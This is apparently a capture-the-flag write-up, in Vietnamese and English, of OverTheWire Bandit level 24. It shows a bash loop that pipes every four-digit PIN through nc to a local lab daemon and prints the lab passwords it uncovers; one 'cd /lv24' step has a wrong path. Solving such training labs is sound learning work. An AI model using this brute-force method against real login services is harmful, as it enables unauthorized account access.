# 🎯 Bandit Level 24

## 📌 END goal: Tìm key bị giấu
**Describe**: A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time


```
host: bandit.labs.overthewire.org
port: 2220
username: bandit24
password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

```
---

## ⚙️ Cách thực hiện:
**Payload:**
```bash
ssh -p 2220 bandit24@bandit.labs.overthewire.org
nc localhost 30002
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 9999
Ctrl+C
cd /tmp
mkdir lv24
cd /lv24
nano script_lv24.sh

#!/bin/bash
for i in {0000..9999}
do
        echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" >> input.txt
done
cat input.txt | nc localhost 30002 > output.txt
#Ctrl+O -> Enter -> Ctrl+X

chmod +x script_lv24.sh
./script_lv24.sh
cat output.txt | grep -v "Wrong!"
```

-Ở lab này, ta cần brute-force để tìm ra pincode gồm 4 kí tự để gửi tới port 30002 để tìm ra key đúng.   
-Thử ```nc localhost 30002``` và nhập 1 giá trị bất kỳ xem server sẽ trả về gì:   
```bash
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 9999
Wrong! Please enter the correct current password and pincode. Try again.
```

-Ta biết được thông tin nếu nhập sai sẽ có đoạn text: ```Wrong! ...```   

-Giờ viết 1 đoạn shell script brute-force để tìm ra pincode chính xác:
```bash
#!/bin/bash

for i in {0000..9999}
do
        echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" >> input.txt
done
cat input.txt | nc localhost 30002 > output.txt
```

-Sau khi chạy script, ta sẽ nhận được file output.txt chứa các dòng thông báo của server trả về khi gửi 10000 pincode, giờ chỉ cần lọc dòng không chứa 
thông báo "Wrong!" bằng lệnh: ```cat output.txt | grep -v "Wrong!"```

### Key: iCi86ttT4KSNe1armKiwbQNmB3YJP3q4